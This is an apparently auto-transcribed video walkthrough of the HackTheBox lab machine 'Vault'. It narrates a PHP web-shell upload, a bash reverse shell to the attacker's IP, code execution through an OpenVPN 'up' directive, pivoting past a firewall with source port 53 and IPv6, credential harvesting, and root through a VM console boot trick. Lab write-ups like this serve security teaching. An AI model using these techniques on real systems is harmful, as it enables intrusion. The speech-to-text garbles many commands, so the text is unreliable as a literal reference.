 what's going on YouTube this is it Zack and we do involve from back the box which was a really fun box that benefits those that do recon well because there's two things in particular on this box that are annoying and eat up time but if you do good recon you don't even notice them so the very first thing I'm talking about is the initial foothold is finding a image upload script most people found that through constant go Buster in order busting and that's time consuming in lame there is a login page and if you change the host name in the header to localhost it thinks you're coming from the Box gives you a 302 redirect right to the image upload so that is the first thing that recon can help you with we find that through W fuzz the second thing is this box has a lot of pivots and one of the pivots you have to set the source point to 53 to get through a firewall at least on ipv4 if you do ipv6 and ping the multicast address on the link local to see that you can reach other boxes over ipv6 that's another way around the firewall that's really cool and easy so with those things being said let's just jump in the box as always we can begin with the end map so - SC for default scripts SV enumerate versions Oh a output all formats plan the end map directory and call it vault and then the IP address which is 10-10-10 109 this can take some time to run so I've already ran it look in the results we have just two ports open SSH is on port 22 HTTP is on port 80 and if we went to Google or Launchpad to search these versions like Ubuntu 4.2 4 we'd get this is most likely a Ubuntu zaniel box since HTTP has much more of an attack surface than SSH that's where we're gonna begin so let's go over to a web browser and go to 10 10 10 109 and we get just a basic web page that says welcome to this slow daddy's web interface and then a bunch of information but we're proud to announce our first client spark lays spark lays calm is still under construction so the first thing I want to do is check virtual host routing with spark lays so we're gonna get a foxy proxy go to burp suite make sure burp suite is set to intercept refresh this page to send the request to book and then then press ctrl R to send this to the repeater tab control shifter to switch to repeater and I'm going to click go and we see exactly what we saw on the web browser so now I'm going to change the host to be spark blaze calm click go and we get the same exact thing so that's nothing there and then the next thing I'm going to do is turn intercept off I'm going to try guessing a few pages so we're gonna do like squiggly sparklies to see if that's anything let's just try slash sparklies and we get a forbidden another thing I'd normally text of course is like robots.txt but we know the directory spark lays exists so I'm going to send this to der Buster to see if we can find any content inside of it so when I do go Buster - you four URL HTTP 10 10 10 109 slash parkways slash and then - w-4 word list user share word list der buster directory list - 3 medium and then we're going to do extensions I'm gonna do HTML and PHP because these are common extensions if you want to find out if the server is a PHP server or a host PHP a good way to do that is to go to the web root where you see something and then try like slash index slash index dot HTML getting a 404 let's try index dot PHP and we get a page and this is useful because normally at the root of the web server you know the file name is index and that does a search on various extensions so all you have to do is guess the extension to kind of find out what it supports not foolproof but does work sometimes so we have extensions as HTML and PHP and the reason why I'm doing extensions is because we're in a web directory so chances are there are files here and then we're going to do - oh for output file I'm going to this go Buster - spark lays dot txt that looks good actually - T four threads and wisp s550 threads I think the default is 10 threads doing 50 because well with specifying extensions which means it's going to be a lot bigger than it normally is this is going to 220,000 URLs it has found login dot PHP admin dot PHP and design so let's check each of those let's go to login dot PHP we get access denied nothing gets sent back let's try admin dot PHP we get a please login let's try admin admin admin sparklies and we don't really get anything so I'm just gonna send this over to SQL map and then we'll come back to it potentially so we'll do admin password intercept request law again and then we want to right click go to copy to file and then we give it a file name so we'll call this sparklies - login dot request save the file go back to a terminal window and we can do SQL map - r4 request sparklies login dot request and then we want to do dot dash dash match so SQL map doesn't prompt us for any input so we'll let that go and then there was a slash design we want to look at so let's go back to Firefox and go to sparklies slash design and our interceptors on still so let's turn intercept off and we get a four three forbidden so let's go back to our go Buster's and we'll start a new one on slash design I've already ran this complete go Buster so I know it's not gonna find anything else so I'm just going to ctrl C this because if I ran multiple of these my computer could go slow and debug with that when I'm doing a video so we'll just change this - you and go Buster to be sparkly slash design we'll use the same word list same extensions and and the output file would do throw Buster - Barclays - design dot text and then hit enter and see if this comes with anything we have a slash uploads directory and a design dot HTML so let's check out what slash uploads is we get a 403 forbidden we can try design dot HTML and it comes with a link for a change logo so we'll click that and we get to a upload form so let's create a file so I guess SQL map has finished already and didn't find anything but we'll create a directory called uploads and then we're going to create a file to get uploaded so when I create the file run dot PHP and then we're just gonna put a PHP script so it's going to be a system call we're gonna take something from a HTTP variable and that variables name will be pleased at subscribe and then we can close that and that will be it so we're going to pass the variable please subscribe and that HTTP request and PHP is going to run system against that so let's go back over to Firefox go to browse and we want to do HB boxes vault and then uploads run dot PHP we definitely want to intercept this request select upload file go to burp press ctrl R to get a repeater control shifter and we'll send this and we get sorry that file type is not allowed so the first thing I'm going to do is change the mime type this application /x - b P will do image / JPEG and that way is not allowed let's do gift because I know the magic bytes - a gift file I believe click go it's not allowed so the first thing I'm gonna do is go to run dot PHP and I'm gonna put gif eight seven calling that way if I do a file against this file is gonna think this is a gif image if we remove that the very first bytes will not be that and it thinks it's a PHP script so that's just how the magic bytes work and I should have done that in here so we'll do gift eight click go and we get file type not allowed so the next thing I'm going to do is try to change the extension we'll put the extension as let's try gif gif we get it was uploaded successfully which I dot PHP click go we get it's not allowed we'll try like PHP five maybe they just have a blacklist on PHP and we get the file was uploaded successfully so I want to what try and intercept off and we can test those uploads because there was that slash uploads directory so we go to slash uploads and then we can try like was it run dot jpg if we get that file is there if we do gif dot PHP five we have that file as well so let's turn intercept on refresh the page send this over to a repeater tab and we want to right click change the request method to a post and then we can do please subscribe equals Who am I click go and we get dub-dub-dub data and the reason why we have to have this PHP five is because the webserver most likely won't execute PHP scripts and dot gif files we can get rid of the PHP five and verify that and it just sends us the PHP syntax so but the dot PHP five back on and we want to get a reverse shell so I'm going to do bash - I and then I think that's a greater than equal sign will do dev TCP ten ten fourteen check out what my IP address is if config tun zero we are three so ten ten fourteen three I'm gonna send the shell to port 9000 one and zero greater than and one we want to highlight this whole thing press control you to your l encode this and then don't forget to listen on port 9000 one so we can go back click go and we don't get anything so I'm going to on your own encode this because I'm gonna modify it and we're gonna put bash - see around this if you don't know this reverse I will just go to like pentester monkey comm or Google pen test monkey reverse shell cheat sheet and you'll come with a bunch of reverse shells so now that it's between ambassy click go we don't get a response here which is good because the web server is probably waiting for us to close out and what i mean by that is we don't have a response if I do exit we should get the response back yeah so that just means the web server is waiting for our thread to die before it responds so let's do the Python trick to get a real show because right now if I do up down left right it does all these annoying control characters so we'll do Python - C input PT y PT y dot spawn then - and then we want to background this with control Z s TTY raw - echo and then hit F G enter you won't see it typed and enter twice and we're in this and we can be used left-right keys which is nice we don't have control l to clear the screen unless we do export term is equal to I think X term will work and now we can do a screen clear so now that we're on the box the very first thing I want to do is check out that admin dot PHP to see if it exposes a password because we may be able to use that password as like the root password an account password etc so harvesting passwords is always a good idea checking login dot PHP it literally just prints access denied if we check admin dot PHP we get a mix between HTML and PHP which is always a pain to read so we're setting username domain and request URI from there HTTP variables and let's see domain is equal to a server server name so I think this is gonna get pulled from the host header and then we get request URI which is probably going to be the URL so if domain is equal to localhost print welcome Dave and set the location to sparkle a local admin interface one PHP if the username is equal to Dave give it a cookie that says barclays data stores HTTP - unbreakable cookie I'm guessing this is a rabbit hole if you use like W fuzz to brute-force the login it would go with Dame and you'd see weird logic of it setting a cookie and think there's something to break about the cookie but the cookie is probably actually unbreakable since it doesn't look like there's any logic we can look at sparklies local admin interface to see if it's pulling data from that cookie and let's just clear the screen to make this a bit easier to read and it doesn't look like it's pulling anything from the cookie we do have the directory server settings so if we go here and cat service HTML it just says under construction so there's nothing there the only thing this is doing is saying let's verify that that's the logic we thought so let's turn intercept off go back to sparklies slash admin dot PHP this is the login prompt and we had logic that said if the local hoe if domain is equal to localhost and then do something so we'll send this to repeater set the domain to localhost click go and it gives us a 302 redirect for logging in so I guess the way you're intended to find this is through host pollution which isn't really a common attack I don't even think Burpo anything will find that since I am on professional while we go dig into this let's see if it does find it I know Nets Berkut doesn't which is the web application scanner I normally use for commercial work but well right-click on sparklies admin dot PHP since this is the one that has that login form and the logic for checking local host would do an active scan yes it is outside my scope I am fine with that if we go to scanner we can see it is currently scanning that so we'll see if burp even checks for this and well burp is doing that lets us do this so would do let's go w fuzz - you for your l HTTP 10 10 10 109 slash Berkley's spark way has it s yep slash admin dot PHP and we want to do a header so that is - capital H and we'll say host is equal to fuzz and then we have to specify the word list we want to use and we'll go to OS user share SEC list and then discovery DNS and we'll do I guess fierce - host list wellmaybe name list is localhost and name list name list it is so we use name list text so copy this paste that and we want to probably hide all 200a quests so - - h c to hide code 200 or - - HC space 200 i mean and then we want to hide these for hundreds so I'm just going to do - - h 8h to hide the number of characters and we'll do for 22 and let this go it looks like it's in alphabetical order so we should hit elves relatively soon to see if localhost yep does get flagged so we can see that's a three or two requests if we go back to burp we see it is finished we can look at the activity and this is sparklies design run what okay double click this and or tell us and we don't have anything about that host name pollution so that was a fun rabbit all that you can just bypass accidentally through good recon and that is how you normally get out of rabbit holes is just having really good recon so let's go to slash home and look at the users can we get into these directories weekend so let's go into Dave and we can do fine dot - I think - file is a thing - f a type F if I could type yep and then do - LS and we can pipe all error messages - Davin all we can look at all the files and directory we have root txt swap so let us do a xxd against this this is a VIN file and let's see we can see all the strings it doesn't look like there's any hash in here so that is a artifact but not an important one so let's go back to this find and we have stuff on the desktop so we have server's key and SSH since I could get into Alex as well let me double check this directory and we have a server ISO which is probably going to be the Ubuntu ISO we also have root text as well so let's check this one as well and this is the same exact file so let's go back to Dave desktop and check out what servers key and SSH is so we'll cat servers and we get a few IP addresses DNS plus configurator 192 168 1 22 4 firewall is the same 5 and the vault it doesn't tell us what the IP is so if we cat key we just get a text that says it's coming home and cat SSH we get Dave and then it says Dave the Rav 3 1 2 3 so I'm guessing these are going to be SSH keys so let's just split the pane we can do SSH Dave at 10 10 10 109 and then put the password in and it logs us in so we can get rid of this reverse shell so we killed that pain I just did I think control B X to kill the pain let's go back to desktop and let's look at servers so if we do an if config we can see quite a bit of information and we see the vir BR 0 so this is a bridge interface and because the server's both on the 10 network and this we know we're probably on the host machine to something with a lot of VMs so let's cat servers and we can ping 192 168 1 22 4 and then we can hang 5 and see both those row up so let's see let's just do neck cat - zv + 1 i - 168 1 22 4.22 we can see ssh is open let's try 8080 is open as well let's try that on the firewall which is 5 4 & 5 4 doesn't work on 8422 so we could upload a static version of nmap and start doing a map to find other ports so let's do that so let's do opt static binaries find dot grep and map and we want to copy binaries Linux x86 64 and map to http boxes vault and we can't because the directories called ed map so we'll call this a map elf and go back to the previous directory with CD - make der dub dub dub MV and map elf - and map but to dub dub dub /n map now we can go into this directory and Python - M simple HTTP server go back to our SSH she'll go to dev sh m and then we can curl 10 10 14 3 port 8000 and map it's not installed so let's do W get and then we can chmod plus x2 and map and now we should be able to execute and map - H yep we can so we can do and map 192 168 1 22 4 to 5 and we have to do dot slash and we see the only ports are open or SSH and HTP so let's do a SSH port forward so I'm going to hit the squiggly capital C so hold shift and hit those two keys and it has to be the very first command you do on a line so when I hit enter squiggly sea and we enter this SSH prompt we can do help and see the commands so we'll do that again and I want to do a local port forward I think if you do the watch the reddish video we explain a lot of this but local means the client is going to listen on the port so we're going to do local port 8000 1 and we want to send that traffic to 192 168 1 22 4 on port 80 so hit enter forwarding the port so and the reason why our Cali box is the client is because we're SSA Qing into this box so Dave at Ubuntu is the server if SEC at Kali is the client so - L listens on port 8000 1 so if we do curl localhost 8001 we can navigate to that page we could also do a dynamic port forward which is a socks5 proxy so if we go back into that we can do a dash capital D 1080 so if we did proxy chains so let's make sure proxy change comm says Sox 5-1 27001 1080 so we can just do proxy chains curl 192 168 1 22 4 and that's the same exact thing as localhost 8001 but this way we're not hard coding a bunch of so it's a bit easier to manage and if we wanted to go through book you can go through user options and then set this socks proxy server so we can do localhost 1080 and then click this I just don't like doing this because you can't do upstream proxy with that so this sends everything through burp through that proxy which means your internet traffic as well so let's just do localhost 9000 won and we will disable ber so get a foxy proxy turn it off and it was 8,000 won not 9,000 won and now we're tunneled through the initial box and hitting the DNS server and we get two links modify your DNS settings we get a 404 not found click here to test your VPN configuration and it looks like we can potentially create a VPN file and execute it so if we just Google like Open VPN config code execution we go to this medium article and we can look at this and it looks like the O VPN files have a way to execute codes once the tunnel comes up so let's just copy this go back here paste it in let's see can we make this bigger we can so remove we probably want to do 120 to one which is the bridge interface it's not worry about setting an IP address because I don't want to do like IP conflicts but it says no bind must be used in this note so I'm adding no bind and then we're doing up it's doing that bash - C and then doing bin bash - I so this exact reverse shell we use before dev TCP 192 168 1 22 1 and we'll send it to port 9000 to click update file and we probably should go back to our SSH thing and do NCL vnp 9002 and then if we click test VPN nothing happens let's see control you to view the source we should be able to test the VPN it looks like it's hanging I'd expect to see this not load so maybe it's trying to go to the 192 address I'm not sure exactly what's going on so let's send this over to burp suite and then configure a proxy so localhost 1080 click go we can turn intercept off to make sure we can hit the page first and to go to 192 168 1 22.4 copy this enter paster config again intercept on update file and it's doing a bunch of URL encoding control shift you to on your El encode and I think I see what's going on these are I think Unicode quotes so let's change this to be regular ASCII so you can see like this single quote is facing a direction now it's not so I'm just retyping them because it copied bad characters most likely I'm guessing Open VPN is just toking on those characters and let's do one more time because it didn't look like it sent it to burp so single double single double proxy and a cept on update file we got it for the file and it's still just waiting but we'll ignore the waiting click test VPN the request is going forward the request and we don't get anything so listening on 9000 - then bash - see 192 168 1 22.1 9000 - that should work if config when I do 168 120 2.1 let's shouldn't have to paste that let's change this shell to the exact one we were using before so greater than and and then 0 and 1 let's try that update file update update update update update TAS TAS TAS TAS test and of course I wasn't listening on that cat when I did that so maybe we have to go back modify DNS setting nope that was a 404 revert the machine because I think something should be happening here so we'll just revert the Machine and yeah all right the box has been reverted so let's get our connection back in the pasture for Dave is da v3 the Rav 3 1 2 3 so I'm going to put that on my clipboard and then we'll do the SSH command instead of going into the SSH options let's just specify it via the command line so - D 10 80 - L we want was it what did we do for the ports it was localhost 8001 I think so we do - L 8,000 one one 2700 one nope it's one I - 168 1 22.4 480 I believe and shift insert - paste the password and we're logged in if i refresh this page we're back at the VPN configurator so if we click test VPN it says executed successfully so my guess at what happened is it really freaked out at all this Unicode so let us paste this a bit better so single double there single double there okay and let's change this to 120 2.14 9000 - and we've had this as 120 - 1 so NC l v NP 9001 let's change this to 9001 since I just listened there let's see we need no bind so no bind that should be the exact thing we had done before so let's update the file and it didn't hang so we can click test VPN and we get a shell the only thing I don't like is that we're SSH into Dave then running that cat and then getting the shell let's say we wanted to send the shell all the way through Dave and back to our Cali box so I'm going to listen on port 9000 one on Kali and on Dave we're gonna enter that SSH command again do - are to listen on the server because the server is Dave or Cali box is the client and we're going to do one 2700 one port 9001 and direct it through the tunnel so it'll be directing back to our box and we're going to send it to one 27001 9001 so we can do netstat a LNP grab 9001 to confirm ssh is listening and it's odd that it's listening on all interfaces which is zero zero zero I'm used to it's only listening on localhost when I do that and most SSH configs will only let you listen on localhost on reverse port forwards so I'm not sure exactly what's going on here but now if we clicked test VPN again we get the shell back on our Kali box the way I normally work around the it only listening on localhost interfaces is I normally use so cat to send it through the tunnel or to listen on the routable interface so I would send the so cat static binary oh actually we can just do this so we're on this box we can curl localhost now we can curl 10 10 14 3 port 8000 so cat and we actually have to do W gets because curl is not on this box and then we can go on our box and do find a static binaries grep so cat copy so cat let's see binaries there we go this one copy this to dub dub dub download it chmod plus x so cat and we can do dot slash so cat TCP listen on port 9000 one find it to the interface 192 168 1 22 1 for kit reuse the address and then tcp localhost 9000 1 is how i would do this we can't bind because the address is in use but if we do up and listen on port 9000 to send this to the background with the ampersand at the end and we could also just curl localhost 9000 to netcat it because coals not on the box and we can exert this 9001 so point nine thousand two goes through the tunnel shouldn't went through the tunnel es EF graphed so cat listen on nine thousand two we only bound to the interface 192 168 1 22 1 so there you go so that's how i would generally do this but because message has been figured to just let us we can just get a shell directly on the route at dns so the first thing i'm going to do take a poke around the scripts so index dot PHP that's just the page notes instructions cat VPN config into how this script works so let's go to home and do the same thing we did before so find dot dash type F dash LS and look at the files in home Alex doesn't look like he has anything Dave the first thing I see is user dot txt it's 33 characters long so that's probably the md5 sum and a line break and then we have SSH so I'm going to check what that file is and we have potentially new cadential Dave and dangerous so I'm just going to create a file on a box because of reasons so now let's think about what we have let's do a if config we were 192 168 1 22.4 if we cat Etsy host we get some new boxes so we know what DNS that's 127 0 is 1 1 and we finally get volts IP address so I'm going to first let's go in the Python import PT y PT y dot spawn the reason why I'm deciding to run this is because if we run any commands that just hang I won't be able to control C without killing the show which is annoying so this will let us control C so we did that s TTY role - echo foreground it so now we can try to ping one I to 168 5 - which is volt and we don't get anything so we can try to paint 192 168 1 22 for that's us I think five is the firewall I think five for yep so let us do an IP route and we see that um traffic for 192 168 5.0 is being sent to 192 168 1 20 to 5 so let's do a n map - P capital P n and this is going to not send a ping it's just gonna assume the host is alive I'm gonna do 192 168 5.2 which is the IP address in the host file and then I'm going to do - and to not do dns and then - V to show us the results as it finds them the command has finished and we only got two ports come back and this ports say they're closed and I'm thinking this could just be lazy firewall design because well DNS has to go to the firewall so maybe the firewall config just said hey allow any port 53 and that's why we're getting closed back because the server actually responded to us with that I forget what the response is silver respond to us saying the port is closed and every other port we just didn't hear anything back so I'm gonna do a - - source - port on 53 so this is gonna set the source port to 53 on every request and we're going to try this again to see if the firewall allows it and it may allow it if it just says hey any port 53 allow through and we get one open port that is 987 and I think that's gonna be all the ports it is so we could do like netcat and then 1 9 - 1 68 5 - 9 87 and we want to specify - P which sets the source port to 53 and we see the server responds to us with a SSH banner so we have to get a SSH packet to this host but before we do I want to show a few other ways around this the very first way around this will be hold on let's just exploit term is equal to X term is ipv6 the firewall may not be listening or may not have rules 5p v6 so if we do it if config we can see your interface is ENS zero so I'm gonna do ping - capital I ENS but the interface is ENS three not zero I don't know why I said that but we're gonna specify the interface of ENS three and ping the ipv6 multicast address and let's see ping - I NS 3f f 0 2 1 oh I forgot ping 6 there we go and we get a few responses back we could just do IP - six neighbors and we can see the responses we have Beth we do if config we see her dress is the a B 4 9 and that is not one of these so we got 3 B D five seventy sixty six and seven four four one we do an up - am we can see that one twenty two one is a B 4 9 and I don't see that here we have three BD v 3 BD 5 which is the firewall so we want to know who seventy sixty six and seven four four one are so we can try a nmap - six for ipv6 paste the link local address and we do % e NS 3 to send them through this interface and if you want to know why we do all this I recommend watching the sneaky video which I go into ipv6 so give a map like 45 60 SEC's to finish and then we'll see if any ports are coming back port 9 87 came back so that is the guy we want let's just see who seven four four one is out of curiosity so we can copy this and then do and map - six and we didn't specify the ENS 3 so it Airedale I type out so it air it out and we'll give an map well it came back and no ports are open on that host so this host is open on that port already showed you saw me do it again we can just do let's just get the IPS again with IP - six neighbors and it was this middle one that was the one we wanted and then we can do SSH the IP % en s3 and we want to use the Dave user so Dave at that oh it was on port nine eight seven and then we want to get his password so let's just cat that so we can copy it easier paste I said paste and we get in so the other way to do this would have been using so cat with the source port so you'd binary interface and then forward it to this guy and set the source port we can try that real quick I haven't done that before so I'm going to guess at the syntax to have a CH M is that what we had oh we don't have neck cat here yet so if we curl let's see I'm going to send a port from this guy to our box so let's see whoops that's not to me I want I want to do squiggly and then pound sign and that's going to list all my port forwards and we're no longer sending anything to a web server so I'm going to do that again can we do - are and say do 80 what for eight-to-one 27001 8,000 so now dns should be able to curl and go to 192 168 1 22.4 / 4 eights no let's see curl localhost 4/8 NC - zv the port is open to have the IP right o dot one dot dot 4 dot 1 okay so we can grab so cat - oh so cat chmod plus x so cat and then we want to do dot slash so cat tcp listen or it would do seven thousand one and then we don't need a bind address we want a fork we use the address so i send it to tcp localhost nine eight seven source port and we want to put 53 and then space ampersand to background it cannot execute so cat file on so cat as elf 64-bit and our box is a 32-bit do we have so cat we do not if this box had n map and so it probably has n cat it does so we can do n cat - l on port [Music] 7,000 won and I'm going to do - - Sh exec and then we want to sand it - netcat 192 168 52.9 87 - p4 source port 53 ampersand to put in the background and now if we ssh to local host on port 7001 so dave at local host we can SSH into the box so that's how you do it through either ipv4 or ipv6 the ipv4 address Oh the ipv6 way is easier in my opinion so we'll left with this one file which is root text GPG if we try to cat this cat root text GPG we see it is just encrypted so we can try GPG root text GPG and we see it is encrypted with the RSA key ID d 1 eb 1 f 0 3 and we don't have that key if we do GPG - list keys we don't have any keys so we can cat @ c passwd and we could potentially get to Alex but I don't know Alex's password so let's go to Dave on the Ubuntu box see if he has any keys g PG - list - keys and we have the key D 1 eb 1 f 0 3 which is the correct RSA key so we just got to get that file to this box so if we exit this we can just SCP the file to the DNS server so we can do let's see let's just do I pee - six neighbors SCP - capital P four point nine eight seven and then one do the host oh I don't know how to SCP and ipv6 maybe we put it in brackets that's normally how you do it and then the file which is a colon we want root anything with root and we'll copy it here forgot to put Dave okay host that's odd gave the correct error message maybee SCP - six that's C SCP if we Google we got two and proxy off because Oh burps going through socks SCP with ipv6 let me have to edit the host file SCP - 6 root @ % I've got the % % en s3 there we go so let's grab is password it is important to specify interfaces when using localhost things link local addresses so now we got root dot txt on the DNS server and if we ask you - Dave do we have keys here probably not list keys we do not so let's just copy this over to our Ubuntu box so let's see how do we to the DNS that was oh we can just neck at this so netcat LVN P will do quad nines to root x GPG and then we'll do cat cat root x g PG pipe it over to 192 168 1 20 to 1 for four nines sent the file if we md5 sum on both ends same hash so now Dave should be able to do G PG to decrypt it and at once a passphrase if you remember from the beginning of the box he had a file and desktop called key that we have not used yet so we're going to take that and do that GPG command again we're gonna put it's coming home as the key and it looks like it has successfully decrypted if we do LS - la we should see root text and it's 33 characters long so that is the intended way to do this whole box there is a unintended way which is pretty cool it uses the spice port setup and I think this box used qmu but if we do metstat a OMP grep list and this is generally how you prove ask you look for things that like listen on localhost or things like just random things that may be running as root and then experiment with them and we see one 27001 5959 o1 and 5902 or listening if we do a psdf and grep for 5900 we can see what that is that is libvirt with q mu and that is the spice port which is really a VNC essentially so let us try to use its remote - viewer to view spy sports and we don't have it let's do at install vert viewer which is contains the binary remote viewer now that that's installed we should be able to do remote viewer if my session will finish there we go remote viewer and then spice and we want to send it to one 2700 one port 5900 and i want to send this through proxy chains which will go through or socks proxy so this remove your command is going through an SSH tunnel and then go into localhost 5900 and we can see this host is calling itself firewall one and we have a login prompt I don't want firewall one I want the vault so let's try 5901 let's see what this is this says vault and we're at a login prompt what we can do is go to send keys and send control-alt-delete to reboot the box and I'm gonna speed up the video once we get past this next part because it could take a while to boot I pressed e to edit grub and we go down and we just want to do a password recovery as if we were physically on the box so I go to the Linux line press end readwrite and then we do an it equals bin Sh and press ctrl X to boot with that command and what that's going to do is soon as it loads it gets passed and starts loading the kernel it'll execute bin bash or bin SH and give us a prompt and then we can change the password reboot the box again and then login and this is the part I was going to speed up because this will problem take two to three minutes so we're at a Shell and I don't think I can make this font any bigger but I can put it against black which may be easier to read I'm just gonna do passwd change the password to please subscribe I can type it twice correctly that would be amazing okay it's been updated I like just hitting our typing sync to make sure the file has changed and then we want to send control-alt-delete again to reboot the box and I'm going to just press ENTER to boot into Ubuntu and we'll speed the video up again while Ubuntu boots and then try to log in we have to login prompt so we can type root and then please subscribe and we login so you can do this to get on a root access to all the VMS we never got into the firewalls so if you wanted to you could get into the firewall using this method and see how that's exactly configured so hope you guys enjoy the video take care and I will see you all next week